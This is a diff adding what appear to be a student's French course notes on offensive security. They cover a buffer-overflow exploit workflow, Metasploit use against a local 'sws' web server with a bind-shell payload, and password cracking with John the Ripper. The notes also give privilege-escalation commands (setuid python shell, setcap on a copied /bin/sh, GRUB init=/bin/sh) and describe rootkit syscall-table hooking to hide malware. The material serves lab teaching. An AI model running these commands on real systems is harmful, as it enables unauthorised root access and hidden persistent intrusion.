@@ -1,0 +1,102 @@
+on veut mettre un call eax a la place de l'addresse de retour, 
+    on met un breakpoint au debut du buffer
+        5b960408 pointe sur notre breakpoint
+
+
+On peut sauter eip pour obtenir plus d'espace lors de l'exec du shellcode dans le buffer
+
+
+
+
+
+
+
+
+cd Document/metasploit-framework
+
+
+    ./msfconsole 
+
+show exploits OU search sws     
+
+    use exploits/linux/http/sws                     -> on selectionne l'exploit 
+
+show options                                        -> voir les options de l'exploits
+
+    set RHOST 127.0.0.1
+
+set RPORT 8080
+show payloads
+set payload generic/shell_bind_tcp
+
+    exploits
+
+
+
+
+pour l'exo : 
+
+il faut faire u fuzzing pour savoir sur quel port ça plante
+use cyclique pattern to find la taille du buffer    
+    -> use gdb with set follow-fork-mode child run to find where the program segfaults
+on trouve l'offset à mettre
+on utilise un 'call *reg' à la place d'eip pour jump sur notre buffer (reg pointe sur notre buffer)
+
+ensuite on crée un exploit
+
+
+
+pour kill le port 
+
+netstat -np | grep 8080
+kill -9 XXXX
+
+
+
+
+
+
+/mnt/hgfs/EPITA/TATT/TP3$ sudo john -i pass.txt
+
+
+lookup tables : dictionnaire 
+rainbow tables : plus lente à la recherche mais fichiers moins volumineux
+
+sel --> john
+pas de sel --> lookup ou rainbow tables
+
+
+pour lancer un shell 
+
+sudo chmod +s /usr/bin/python
+python exec 
+python -c 'import os; os.system("sh");'
+
+
+
+
+cp /bin/sh /tmp
+setcap cap_chown+p /tmp/sh
+/tmp/sh/
+chown nico
+
+init=/bin/sh            -> dans le edit configuration de GRUB
+
+
+
+
+
+
+
+
+backdoor : cacher l'illegitimité de l'exec d'un rootkit
+->  cacher l'exec d'un shell sur un port avec netstat par exemple
+
+créer un noyan linux
+    cacher les appels systems
+
+
+les syscalls sont listés dans un tableau du kernel qui contient des pointeurs de fonctions vers kles differnets syscalls
+on veut donc referncer l'appel du syscall vers notre fonctions qui ne va pas notifier l'utilisateur que notre malware est dans l'ordi,
+et qu'il fait des appels systems comme les autres programme
+
